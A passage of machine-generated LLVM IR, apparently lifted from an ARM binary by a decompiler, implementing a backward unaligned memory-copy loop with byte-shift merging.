  store i32 %v6_14ebc, i32* %r0.global-to-local, align 4
  br i1 %v8_14eb4, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_14eb4
  %v9_14eb4 = icmp eq i32 %v1_14e0c, 2
  %v6_14ec0 = load i32, i32* @r1, align 4
  %v7_14ec0 = add i32 %v6_14ec0, -1
  %v8_14ec0 = inttoptr i32 %v7_14ec0 to i8*
  %v9_14ec0 = load i8, i8* %v8_14ec0, align 1
  %v10_14ec0 = zext i8 %v9_14ec0 to i32
  store i32 %v10_14ec0, i32* %r3.global-to-local, align 4
  store i32 %v7_14ec0, i32* @r1, align 4
  %v9_14ec4 = add i32 %v5_14ebc, -2
  %v10_14ec4 = inttoptr i32 %v9_14ec4 to i8*
  store i8 %v9_14ec0, i8* %v10_14ec4, align 1
  %v11_14ec4 = load i32, i32* %r0.global-to-local, align 4
  %v12_14ec4 = add i32 %v11_14ec4, -1
  store i32 %v12_14ec4, i32* %r0.global-to-local, align 4
  br i1 %v9_14eb4, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_14ec8 = load i32, i32* @r1, align 4
  %v9_14ec8 = add i32 %v8_14ec8, -1
  %v10_14ec8 = inttoptr i32 %v9_14ec8 to i8*
  %v11_14ec8 = load i8, i8* %v10_14ec8, align 1
  %v12_14ec8 = zext i8 %v11_14ec8 to i32
  store i32 %v12_14ec8, i32* %r3.global-to-local, align 4
  store i32 %v9_14ec8, i32* @r1, align 4
  %v11_14ecc = add i32 %v11_14ec4, -2
  %v12_14ecc = inttoptr i32 %v11_14ecc to i8*
  store i8 %v11_14ec8, i8* %v12_14ecc, align 1
  %v13_14ecc = load i32, i32* %r0.global-to-local, align 4
  %v14_14ecc = add i32 %v13_14ecc, -1
  store i32 %v14_14ecc, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_14eb4, %bb148
  %v0_14f2832 = phi i32 [ %v12_14ec4, %bb147 ], [ %v6_14ebc, %dec_label_pc_14eb4 ], [ %v14_14ecc, %bb148 ]
  %v0_14ed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ed0 = load i32, i32* @ip, align 4
  %v2_14ed0 = sub i32 %v0_14ed0, %v1_14ed0
  store i32 %v2_14ed0, i32* %r2.global-to-local, align 4
  %v4_14ed0 = xor i32 %v1_14ed0, %v0_14ed0
  %v5_14ed0 = xor i32 %v2_14ed0, %v0_14ed0
  %v6_14ed0 = and i32 %v5_14ed0, %v4_14ed0
  %v7_14ed0 = icmp slt i32 %v6_14ed0, 0
  store i1 %v7_14ed0, i1* %cpsr_v.global-to-local, align 1
  %v8_14ed0 = icmp slt i32 %v2_14ed0, 0
  store i1 %v8_14ed0, i1* %cpsr_n.global-to-local, align 1
  %v5_14ed4 = icmp slt i32 %v0_14ed0, %v1_14ed0
  br i1 %v5_14ed4, label %bb143, label %dec_label_pc_14ed8

dec_label_pc_14ed8:                               ; preds = %.thread26
  %v0_14ed8 = load i32, i32* @r1, align 4
  %v1_14ed8 = urem i32 %v0_14ed8, 4
  store i32 %v1_14ed8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14ed8 = icmp eq i32 %v1_14ed8, 0
  br i1 %v2_14ed8, label %dec_label_pc_14e1c, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %dec_label_pc_14e14, %dec_label_pc_14ed8
  %v0_14f2831 = phi i32 [ %v2_14e00, %dec_label_pc_14e14 ], [ %v0_14f2832, %dec_label_pc_14ed8 ]
  %v0_14fd4 = phi i32 [ %v2_14e04, %dec_label_pc_14e14 ], [ %v2_14ed0, %dec_label_pc_14ed8 ]
  %v0_14ee0 = phi i32 [ %v2_14dfc, %dec_label_pc_14e14 ], [ %v0_14ed8, %dec_label_pc_14ed8 ]
  %v0_14ee8 = phi i32 [ %v1_14e14, %dec_label_pc_14e14 ], [ %v1_14ed8, %dec_label_pc_14ed8 ]
  %v1_14ee0 = and i32 %v0_14ee0, -4
  store i32 %v1_14ee0, i32* %r1.global-to-local, align 4
  %v1_14ee4 = inttoptr i32 %v1_14ee0 to i32*
  %v2_14ee4 = load i32, i32* %v1_14ee4, align 4
  store i32 %v2_14ee4, i32* %r3.global-to-local, align 4
  %v7_14ee8 = icmp ult i32 %v0_14ee8, 2
  %v2_14fcc = add i32 %v0_14fd4, -12
  %v4_14fcc = sub i32 11, %v0_14fd4
  %v5_14fcc = and i32 %v4_14fcc, %v0_14fd4
  %v6_14fcc = icmp slt i32 %v5_14fcc, 0
  store i1 %v6_14fcc, i1* %cpsr_v.global-to-local, align 1
  %v7_14fcc = icmp slt i32 %v2_14fcc, 0
  store i1 %v7_14fcc, i1* %cpsr_n.global-to-local, align 1
  %v5_14fd0 = icmp slt i32 %v0_14fd4, 12
  br i1 %v7_14ee8, label %dec_label_pc_14fcc, label %dec_label_pc_14ef0

dec_label_pc_14ef0:                               ; preds = %dec_label_pc_14ee0
  %v8_14ee8 = icmp eq i32 %v0_14ee8, 2
  br i1 %v8_14ee8, label %dec_label_pc_14f60, label %dec_label_pc_14ef4

dec_label_pc_14ef4:                               ; preds = %dec_label_pc_14ef0
  br i1 %v5_14fd0, label %dec_label_pc_14f40, label %dec_label_pc_14efc

dec_label_pc_14efc:                               ; preds = %dec_label_pc_14ef4
  store i32 %v2_14fcc, i32* %r2.global-to-local, align 4
  %v3_14f00 = load i32, i32* @r4, align 4
  store i32 %v3_14f00, i32* %stack_var_-12, align 4
  %v6_14f00 = load i32, i32* @r5, align 4
  %v8_14f00 = inttoptr i32 %v6_14f00 to i8*
  store i8* %v8_14f00, i8** %stack_var_-8, align 4
  %v11_14f00 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f04

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14f04.dec_label_pc_14f04_crit_edge, %dec_label_pc_14efc
  %v0_14f28 = phi i32 [ %v1_14f28, %dec_label_pc_14f04.dec_label_pc_14f04_crit_edge ], [ %v0_14f2831, %dec_label_pc_14efc ]
  %v0_14f08 = phi i32 [ %v0_14f08.pre, %dec_label_pc_14f04.dec_label_pc_14f04_crit_edge ], [ %v1_14ee0, %dec_label_pc_14efc ]
  %v0_14f04 = phi i32 [ %v0_14f04.pre, %dec_label_pc_14f04.dec_label_pc_14f04_crit_edge ], [ %v2_14ee4, %dec_label_pc_14efc ]
  %v3_14f04 = mul i32 %v0_14f04, 256
  store i32 %v3_14f04, i32* %lr.global-to-local, align 4
  %v1_14f08 = add i32 %v0_14f08, -4
  %v2_14f08 = inttoptr i32 %v1_14f08 to i32*
  %v3_14f08 = load i32, i32* %v2_14f08, align 4
  store i32 %v3_14f08, i32* %r3.global-to-local, align 4
  %v4_14f08 = add i32 %v0_14f08, -8
  %v5_14f08 = inttoptr i32 %v4_14f08 to i32*
  %v6_14f08 = load i32, i32* %v5_14f08, align 4
  store i32 %v6_14f08, i32* %r4.global-to-local, align 4
  %v7_14f08 = add i32 %v0_14f08, -12
  %v8_14f08 = inttoptr i32 %v7_14f08 to i32*
  %v9_14f08 = load i32, i32* %v8_14f08, align 4
  store i32 %v9_14f08, i32* %r5.global-to-local, align 4
  %v10_14f08 = add i32 %v0_14f08, -16
  %v11_14f08 = inttoptr i32 %v10_14f08 to i32*
  %v12_14f08 = load i32, i32* %v11_14f08, align 4
  store i32 %v10_14f08, i32* %r1.global-to-local, align 4
  %v4_14f0c = udiv i32 %v12_14f08, 16777216
  %v5_14f0c = or i32 %v4_14f0c, %v3_14f04
  store i32 %v5_14f0c, i32* %lr.global-to-local, align 4
  %v3_14f10 = mul i32 %v12_14f08, 256
  %v4_14f14 = udiv i32 %v9_14f08, 16777216
  %v5_14f14 = or i32 %v3_14f10, %v4_14f14
  store i32 %v5_14f14, i32* @ip, align 4
  %v3_14f18 = mul i32 %v9_14f08, 256
  %v4_14f1c = udiv i32 %v6_14f08, 16777216
  %v5_14f1c = or i32 %v3_14f18, %v4_14f1c
  store i32 %v5_14f1c, i32* %r5.global-to-local, align 4
  %v3_14f20 = mul i32 %v6_14f08, 256
  %v4_14f24 = udiv i32 %v3_14f08, 16777216
  %v5_14f24 = or i32 %v3_14f20, %v4_14f24
  store i32 %v5_14f24, i32* %r4.global-to-local, align 4
  %v1_14f28 = add i32 %v0_14f28, -16
  %v2_14f28 = inttoptr i32 %v1_14f28 to i32*
  store i32 %v5_14f24, i32* %v2_14f28, align 4
  %v4_14f28 = add i32 %v0_14f28, -12
  %v5_14f28 = inttoptr i32 %v4_14f28 to i32*
  %v6_14f28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f28, i32* %v5_14f28, align 4
  %v7_14f28 = add i32 %v0_14f28, -8
  %v8_14f28 = inttoptr i32 %v7_14f28 to i32*
  %v9_14f28 = load i32, i32* @ip, align 4
  store i32 %v9_14f28, i32* %v8_14f28, align 4
  %v10_14f28 = add i32 %v0_14f28, -4
  %v11_14f28 = inttoptr i32 %v10_14f28 to i32*
  %v12_14f28 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f28, i32* %v11_14f28, align 4
  store i32 %v1_14f28, i32* %r0.global-to-local, align 4
  %v0_14f2c = load i32, i32* %r2.global-to-local, align 4
  %v2_14f2c = add i32 %v0_14f2c, -16
  store i32 %v2_14f2c, i32* %r2.global-to-local, align 4
  %v6_14f30 = icmp slt i32 %v0_14f2c, 16
  br i1 %v6_14f30, label %dec_label_pc_14f34, label %dec_label_pc_14f04.dec_label_pc_14f04_crit_edge

dec_label_pc_14f04.dec_label_pc_14f04_crit_edge:  ; preds = %dec_label_pc_14f04
  %v0_14f04.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14f08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f04

dec_label_pc_14f34:                               ; preds = %dec_label_pc_14f04
  %v2_14f34 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f34, i32* @r4, align 4
  %v5_14f34 = load i8*, i8** %stack_var_-8, align 4
  %v6_14f34 = ptrtoint i8* %v5_14f34 to i32
  store i32 %v6_14f34, i32* @r5, align 4
  store i32 %v11_14f00, i32* @lr, align 4
  %v2_14f38 = add i32 %v0_14f2c, -4
  store i32 %v2_14f38, i32* %r2.global-to-local, align 4
  %v4_14f38 = add i32 %v0_14f2c, 2147483632
  %v5_14f38 = and i32 %v2_14f38, %v4_14f38
  %v6_14f38 = icmp slt i32 %v5_14f38, 0
  store i1 %v6_14f38, i1* %cpsr_v.global-to-local, align 1
  %v7_14f38 = icmp slt i32 %v2_14f38, 0
  store i1 %v7_14f38, i1* %cpsr_n.global-to-local, align 1
  %v5_14f3c = icmp slt i32 %v2_14f2c, -12
  br i1 %v5_14f3c, label %dec_label_pc_14f58, label %dec_label_pc_14f40

dec_label_pc_14f40:                               ; preds = %dec_label_pc_14f34, %dec_label_pc_14ef4, %dec_label_pc_14f40
  %v1_14f4c = phi i32 [ %v5_14f4c, %dec_label_pc_14f40 ], [ %v1_14f28, %dec_label_pc_14f34 ], [ %v0_14f2831, %dec_label_pc_14ef4 ]
  %v0_14f40 = load i32, i32* %r3.global-to-local, align 4
  %v3_14f40 = mul i32 %v0_14f40, 256
  store i32 %v3_14f40, i32* %ip.global-to-local, align 4
  %v0_14f44 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f44 = add i32 %v0_14f44, -4
  %v2_14f44 = inttoptr i32 %v1_14f44 to i32*
  %v3_14f44 = load i32, i32* %v2_14f44, align 4
  store i32 %v3_14f44, i32* %r3.global-to-local, align 4
  store i32 %v1_14f44, i32* %r1.global-to-local, align 4
  %v4_14f48 = udiv i32 %v3_14f44, 16777216
  %v5_14f48 = or i32 %v4_14f48, %v3_14f40
  store i32 %v5_14f48, i32* @ip, align 4
  %v2_14f4c = add i32 %v1_14f4c, -4
  %v3_14f4c = inttoptr i32 %v2_14f4c to i32*
  store i32 %v5_14f48, i32* %v3_14f4c, align 4
  %v4_14f4c = load i32, i32* %r0.global-to-local, align 4
  %v5_14f4c = add i32 %v4_14f4c, -4
  store i32 %v5_14f4c, i32* %r0.global-to-local, align 4
  %v0_14f50 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f50 = add i32 %v0_14f50, -4
  store i32 %v2_14f50, i32* %r2.global-to-local, align 4
  %v6_14f54 = icmp slt i32 %v0_14f50, 4
  br i1 %v6_14f54, label %dec_label_pc_14f58.loopexit, label %dec_label_pc_14f40

dec_label_pc_14f58.loopexit:                      ; preds = %dec_label_pc_14f40
  %v4_14f50 = sub i32 3, %v0_14f50
  %v5_14f50 = and i32 %v4_14f50, %v0_14f50
  %v6_14f50 = icmp slt i32 %v5_14f50, 0
  %v7_14f50 = icmp slt i32 %v2_14f50, 0
  store i1 %v6_14f50, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14f50, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14f58

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f58.loopexit, %dec_label_pc_14f34
  %v2_14e9c63 = phi i32 [ %v5_14f4c, %dec_label_pc_14f58.loopexit ], [ %v1_14f28, %dec_label_pc_14f34 ]
  %v0_14e8c59 = phi i32 [ %v2_14f50, %dec_label_pc_14f58.loopexit ], [ %v2_14f38, %dec_label_pc_14f34 ]
  %v0_14f58 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f58 = add i32 %v0_14f58, 3
  store i32 %v1_14f58, i32* @r1, align 4
  br label %bb143

dec_label_pc_14f60:                               ; preds = %dec_label_pc_14ef0
  br i1 %v5_14fd0, label %dec_label_pc_14fac, label %dec_label_pc_14f68

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14f60
  store i32 %v2_14fcc, i32* %r2.global-to-local, align 4
  %v3_14f6c = load i32, i32* @r4, align 4
  store i32 %v3_14f6c, i32* %stack_var_-12, align 4
  %v6_14f6c = load i32, i32* @r5, align 4
  %v8_14f6c = inttoptr i32 %v6_14f6c to i8*
  store i8* %v8_14f6c, i8** %stack_var_-8, align 4
  %v11_14f6c = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f70

dec_label_pc_14f70:                               ; preds = %dec_label_pc_14f70.dec_label_pc_14f70_crit_edge, %dec_label_pc_14f68
  %v0_14f94 = phi i32 [ %v1_14f94, %dec_label_pc_14f70.dec_label_pc_14f70_crit_edge ], [ %v0_14f2831, %dec_label_pc_14f68 ]
  %v0_14f74 = phi i32 [ %v0_14f74.pre, %dec_label_pc_14f70.dec_label_pc_14f70_crit_edge ], [ %v1_14ee0, %dec_label_pc_14f68 ]
  %v0_14f70 = phi i32 [ %v0_14f70.pre, %dec_label_pc_14f70.dec_label_pc_14f70_crit_edge ], [ %v2_14ee4, %dec_label_pc_14f68 ]
  %v3_14f70 = mul i32 %v0_14f70, 65536
  store i32 %v3_14f70, i32* %lr.global-to-local, align 4
  %v1_14f74 = add i32 %v0_14f74, -4
  %v2_14f74 = inttoptr i32 %v1_14f74 to i32*
  %v3_14f74 = load i32, i32* %v2_14f74, align 4
  store i32 %v3_14f74, i32* %r3.global-to-local, align 4
  %v4_14f74 = add i32 %v0_14f74, -8
  %v5_14f74 = inttoptr i32 %v4_14f74 to i32*
  %v6_14f74 = load i32, i32* %v5_14f74, align 4
  store i32 %v6_14f74, i32* %r4.global-to-local, align 4
  %v7_14f74 = add i32 %v0_14f74, -12
  %v8_14f74 = inttoptr i32 %v7_14f74 to i32*
  %v9_14f74 = load i32, i32* %v8_14f74, align 4
  store i32 %v9_14f74, i32* %r5.global-to-local, align 4
  %v10_14f74 = add i32 %v0_14f74, -16
  %v11_14f74 = inttoptr i32 %v10_14f74 to i32*
  %v12_14f74 = load i32, i32* %v11_14f74, align 4
  store i32 %v10_14f74, i32* %r1.global-to-local, align 4
  %v4_14f78 = udiv i32 %v12_14f74, 65536
  %v5_14f78 = or i32 %v4_14f78, %v3_14f70
  store i32 %v5_14f78, i32* %lr.global-to-local, align 4
  %v3_14f7c = mul i32 %v12_14f74, 65536
  %v4_14f80 = udiv i32 %v9_14f74, 65536
  %v5_14f80 = or i32 %v3_14f7c, %v4_14f80
  store i32 %v5_14f80, i32* @ip, align 4
  %v3_14f84 = mul i32 %v9_14f74, 65536
  %v4_14f88 = udiv i32 %v6_14f74, 65536
  %v5_14f88 = or i32 %v3_14f84, %v4_14f88
  store i32 %v5_14f88, i32* %r5.global-to-local, align 4
  %v3_14f8c = mul i32 %v6_14f74, 65536
  %v4_14f90 = udiv i32 %v3_14f74, 65536
  %v5_14f90 = or i32 %v3_14f8c, %v4_14f90
  store i32 %v5_14f90, i32* %r4.global-to-local, align 4
  %v1_14f94 = add i32 %v0_14f94, -16
  %v2_14f94 = inttoptr i32 %v1_14f94 to i32*
  store i32 %v5_14f90, i32* %v2_14f94, align 4
  %v4_14f94 = add i32 %v0_14f94, -12
  %v5_14f94 = inttoptr i32 %v4_14f94 to i32*
  %v6_14f94 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f94, i32* %v5_14f94, align 4
  %v7_14f94 = add i32 %v0_14f94, -8
  %v8_14f94 = inttoptr i32 %v7_14f94 to i32*
  %v9_14f94 = load i32, i32* @ip, align 4
  store i32 %v9_14f94, i32* %v8_14f94, align 4
  %v10_14f94 = add i32 %v0_14f94, -4
  %v11_14f94 = inttoptr i32 %v10_14f94 to i32*
  %v12_14f94 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f94, i32* %v11_14f94, align 4
  store i32 %v1_14f94, i32* %r0.global-to-local, align 4
  %v0_14f98 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f98 = add i32 %v0_14f98, -16
  store i32 %v2_14f98, i32* %r2.global-to-local, align 4
  %v6_14f9c = icmp slt i32 %v0_14f98, 16
  br i1 %v6_14f9c, label %dec_label_pc_14fa0, label %dec_label_pc_14f70.dec_label_pc_14f70_crit_edge

dec_label_pc_14f70.dec_label_pc_14f70_crit_edge:  ; preds = %dec_label_pc_14f70
  %v0_14f70.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14f74.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f70

dec_label_pc_14fa0:                               ; preds = %dec_label_pc_14f70
  %v2_14fa0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14fa0, i32* @r4, align 4
  %v5_14fa0 = load i8*, i8** %stack_var_-8, align 4
  %v6_14fa0 = ptrtoint i8* %v5_14fa0 to i32
  store i32 %v6_14fa0, i32* @r5, align 4
  store i32 %v11_14f6c, i32* @lr, align 4
  %v2_14fa4 = add i32 %v0_14f98, -4
  store i32 %v2_14fa4, i32* %r2.global-to-local, align 4
  %v4_14fa4 = add i32 %v0_14f98, 2147483632
  %v5_14fa4 = and i32 %v2_14fa4, %v4_14fa4
  %v6_14fa4 = icmp slt i32 %v5_14fa4, 0
  store i1 %v6_14fa4, i1* %cpsr_v.global-to-local, align 1
  %v7_14fa4 = icmp slt i32 %v2_14fa4, 0
  store i1 %v7_14fa4, i1* %cpsr_n.global-to-local, align 1
  %v5_14fa8 = icmp slt i32 %v2_14f98, -12
  br i1 %v5_14fa8, label %dec_label_pc_14fc4, label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14fa0, %dec_label_pc_14f60, %dec_label_pc_14fac
  %v1_14fb8 = phi i32 [ %v5_14fb8, %dec_label_pc_14fac ], [ %v1_14f94, %dec_label_pc_14fa0 ], [ %v0_14f2831, %dec_label_pc_14f60 ]
  %v0_14fac = load i32, i32* %r3.global-to-local, align 4
  %v3_14fac = mul i32 %v0_14fac, 65536
  store i32 %v3_14fac, i32* %ip.global-to-local, align 4
  %v0_14fb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fb0 = add i32 %v0_14fb0, -4
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  store i32 %v3_14fb0, i32* %r3.global-to-local, align 4
  store i32 %v1_14fb0, i32* %r1.global-to-local, align 4
  %v4_14fb4 = udiv i32 %v3_14fb0, 65536
  %v5_14fb4 = or i32 %v4_14fb4, %v3_14fac
  store i32 %v5_14fb4, i32* @ip, align 4
  %v2_14fb8 = add i32 %v1_14fb8, -4
  %v3_14fb8 = inttoptr i32 %v2_14fb8 to i32*
  store i32 %v5_14fb4, i32* %v3_14fb8, align 4
  %v4_14fb8 = load i32, i32* %r0.global-to-local, align 4
  %v5_14fb8 = add i32 %v4_14fb8, -4
  store i32 %v5_14fb8, i32* %r0.global-to-local, align 4
  %v0_14fbc = load i32, i32* %r2.global-to-local, align 4
  %v2_14fbc = add i32 %v0_14fbc, -4
  store i32 %v2_14fbc, i32* %r2.global-to-local, align 4
  %v6_14fc0 = icmp slt i32 %v0_14fbc, 4
  br i1 %v6_14fc0, label %dec_label_pc_14fc4.loopexit, label %dec_label_pc_14fac

dec_label_pc_14fc4.loopexit:                      ; preds = %dec_label_pc_14fac
  %v4_14fbc = sub i32 3, %v0_14fbc
  %v5_14fbc = and i32 %v4_14fbc, %v0_14fbc
  %v6_14fbc = icmp slt i32 %v5_14fbc, 0
  %v7_14fbc = icmp slt i32 %v2_14fbc, 0
  store i1 %v6_14fbc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14fbc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14fc4

dec_label_pc_14fc4:                               ; preds = %dec_label_pc_14fc4.loopexit, %dec_label_pc_14fa0
  %v2_14e9c64 = phi i32 [ %v5_14fb8, %dec_label_pc_14fc4.loopexit ], [ %v1_14f94, %dec_label_pc_14fa0 ]
  %v0_14e8c60 = phi i32 [ %v2_14fbc, %dec_label_pc_14fc4.loopexit ], [ %v2_14fa4, %dec_label_pc_14fa0 ]
  %v0_14fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14fc4 = add i32 %v0_14fc4, 2
  store i32 %v1_14fc4, i32* @r1, align 4
  br label %bb143

dec_label_pc_14fcc:                               ; preds = %dec_label_pc_14ee0
  br i1 %v5_14fd0, label %dec_label_pc_15018, label %dec_label_pc_14fd4

dec_label_pc_14fd4:                               ; preds = %dec_label_pc_14fcc
  store i32 %v2_14fcc, i32* %r2.global-to-local, align 4
  %v3_14fd8 = load i32, i32* @r4, align 4
  store i32 %v3_14fd8, i32* %stack_var_-12, align 4
  %v6_14fd8 = load i32, i32* @r5, align 4
  %v8_14fd8 = inttoptr i32 %v6_14fd8 to i8*
  store i8* %v8_14fd8, i8** %stack_var_-8, align 4
  %v11_14fd8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14fdc

dec_label_pc_14fdc:                               ; preds = %dec_label_pc_14fdc.dec_label_pc_14fdc_crit_edge, %dec_label_pc_14fd4
  %v0_15000 = phi i32 [ %v1_15000, %dec_label_pc_14fdc.dec_label_pc_14fdc_crit_edge ], [ %v0_14f2831, %dec_label_pc_14fd4 ]
  %v0_14fe0 = phi i32 [ %v0_14fe0.pre, %dec_label_pc_14fdc.dec_label_pc_14fdc_crit_edge ], [ %v1_14ee0, %dec_label_pc_14fd4 ]
  %v0_14fdc = phi i32 [ %v0_14fdc.pre, %dec_label_pc_14fdc.dec_label_pc_14fdc_crit_edge ], [ %v2_14ee4, %dec_label_pc_14fd4 ]
  %v3_14fdc = mul i32 %v0_14fdc, 16777216
  store i32 %v3_14fdc, i32* %lr.global-to-local, align 4
  %v1_14fe0 = add i32 %v0_14fe0, -4
  %v2_14fe0 = inttoptr i32 %v1_14fe0 to i32*
  %v3_14fe0 = load i32, i32* %v2_14fe0, align 4
  store i32 %v3_14fe0, i32* %r3.global-to-local, align 4
  %v4_14fe0 = add i32 %v0_14fe0, -8
  %v5_14fe0 = inttoptr i32 %v4_14fe0 to i32*
  %v6_14fe0 = load i32, i32* %v5_14fe0, align 4
  store i32 %v6_14fe0, i32* %r4.global-to-local, align 4
  %v7_14fe0 = add i32 %v0_14fe0, -12
  %v8_14fe0 = inttoptr i32 %v7_14fe0 to i32*
  %v9_14fe0 = load i32, i32* %v8_14fe0, align 4
  store i32 %v9_14fe0, i32* %r5.global-to-local, align 4
  %v10_14fe0 = add i32 %v0_14fe0, -16
  %v11_14fe0 = inttoptr i32 %v10_14fe0 to i32*
  %v12_14fe0 = load i32, i32* %v11_14fe0, align 4
  store i32 %v10_14fe0, i32* %r1.global-to-local, align 4
  %v4_14fe4 = udiv i32 %v12_14fe0, 256
  %v5_14fe4 = or i32 %v4_14fe4, %v3_14fdc
  store i32 %v5_14fe4, i32* %lr.global-to-local, align 4
  %v3_14fe8 = mul i32 %v12_14fe0, 16777216
  %v4_14fec = udiv i32 %v9_14fe0, 256
  %v5_14fec = or i32 %v3_14fe8, %v4_14fec
  store i32 %v5_14fec, i32* @ip, align 4
  %v3_14ff0 = mul i32 %v9_14fe0, 16777216
  %v4_14ff4 = udiv i32 %v6_14fe0, 256
  %v5_14ff4 = or i32 %v3_14ff0, %v4_14ff4
  store i32 %v5_14ff4, i32* %r5.global-to-local, align 4
  %v3_14ff8 = mul i32 %v6_14fe0, 16777216
  %v4_14ffc = udiv i32 %v3_14fe0, 256
  %v5_14ffc = or i32 %v3_14ff8, %v4_14ffc
  store i32 %v5_14ffc, i32* %r4.global-to-local, align 4
  %v1_15000 = add i32 %v0_15000, -16
  %v2_15000 = inttoptr i32 %v1_15000 to i32*
  store i32 %v5_14ffc, i32* %v2_15000, align 4
  %v4_15000 = add i32 %v0_15000, -12
  %v5_15000 = inttoptr i32 %v4_15000 to i32*
  %v6_15000 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15000, i32* %v5_15000, align 4
  %v7_15000 = add i32 %v0_15000, -8
  %v8_15000 = inttoptr i32 %v7_15000 to i32*
  %v9_15000 = load i32, i32* @ip, align 4
  store i32 %v9_15000, i32* %v8_15000, align 4
  %v10_15000 = add i32 %v0_15000, -4
  %v11_15000 = inttoptr i32 %v10_15000 to i32*
  %v12_15000 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15000, i32* %v11_15000, align 4
  store i32 %v1_15000, i32* %r0.global-to-local, align 4
  %v0_15004 = load i32, i32* %r2.global-to-local, align 4
  %v2_15004 = add i32 %v0_15004, -16
  store i32 %v2_15004, i32* %r2.global-to-local, align 4
  %v6_15008 = icmp slt i32 %v0_15004, 16
  br i1 %v6_15008, label %dec_label_pc_1500c, label %dec_label_pc_14fdc.dec_label_pc_14fdc_crit_edge

dec_label_pc_14fdc.dec_label_pc_14fdc_crit_edge:  ; preds = %dec_label_pc_14fdc
  %v0_14fdc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14fe0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14fdc

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14fdc
  %v2_1500c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1500c, i32* @r4, align 4
  %v5_1500c = load i8*, i8** %stack_var_-8, align 4
  %v6_1500c = ptrtoint i8* %v5_1500c to i32
  store i32 %v6_1500c, i32* @r5, align 4
  store i32 %v11_14fd8, i32* @lr, align 4
  %v2_15010 = add i32 %v0_15004, -4
  store i32 %v2_15010, i32* %r2.global-to-local, align 4
  %v4_15010 = add i32 %v0_15004, 2147483632
  %v5_15010 = and i32 %v2_15010, %v4_15010
  %v6_15010 = icmp slt i32 %v5_15010, 0
  store i1 %v6_15010, i1* %cpsr_v.global-to-local, align 1
  %v7_15010 = icmp slt i32 %v2_15010, 0
  store i1 %v7_15010, i1* %cpsr_n.global-to-local, align 1
  %v5_15014 = icmp slt i32 %v2_15004, -12
  br i1 %v5_15014, label %dec_label_pc_15030, label %dec_label_pc_15018

dec_label_pc_15018:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_14fcc, %dec_label_pc_15018
  %v1_15024 = phi i32 [ %v5_15024, %dec_label_pc_15018 ], [ %v1_15000, %dec_label_pc_1500c ], [ %v0_14f2831, %dec_label_pc_14fcc ]
  %v0_15018 = load i32, i32* %r3.global-to-local, align 4
  %v3_15018 = mul i32 %v0_15018, 16777216
  store i32 %v3_15018, i32* %ip.global-to-local, align 4
  %v0_1501c = load i32, i32* %r1.global-to-local, align 4
  %v1_1501c = add i32 %v0_1501c, -4
  %v2_1501c = inttoptr i32 %v1_1501c to i32*
  %v3_1501c = load i32, i32* %v2_1501c, align 4
  store i32 %v3_1501c, i32* %r3.global-to-local, align 4
  store i32 %v1_1501c, i32* %r1.global-to-local, align 4
  %v4_15020 = udiv i32 %v3_1501c, 256
  %v5_15020 = or i32 %v4_15020, %v3_15018
  store i32 %v5_15020, i32* @ip, align 4
  %v2_15024 = add i32 %v1_15024, -4
  %v3_15024 = inttoptr i32 %v2_15024 to i32*
  store i32 %v5_15020, i32* %v3_15024, align 4
  %v4_15024 = load i32, i32* %r0.global-to-local, align 4
  %v5_15024 = add i32 %v4_15024, -4
  store i32 %v5_15024, i32* %r0.global-to-local, align 4
  %v0_15028 = load i32, i32* %r2.global-to-local, align 4
  %v2_15028 = add i32 %v0_15028, -4
  store i32 %v2_15028, i32* %r2.global-to-local, align 4
  %v6_1502c = icmp slt i32 %v0_15028, 4
  br i1 %v6_1502c, label %dec_label_pc_15030.loopexit, label %dec_label_pc_15018

dec_label_pc_15030.loopexit:                      ; preds = %dec_label_pc_15018
  %v4_15028 = sub i32 3, %v0_15028
  %v5_15028 = and i32 %v4_15028, %v0_15028
  %v6_15028 = icmp slt i32 %v5_15028, 0
  %v7_15028 = icmp slt i32 %v2_15028, 0
  store i1 %v6_15028, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15028, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_15030.loopexit, %dec_label_pc_1500c
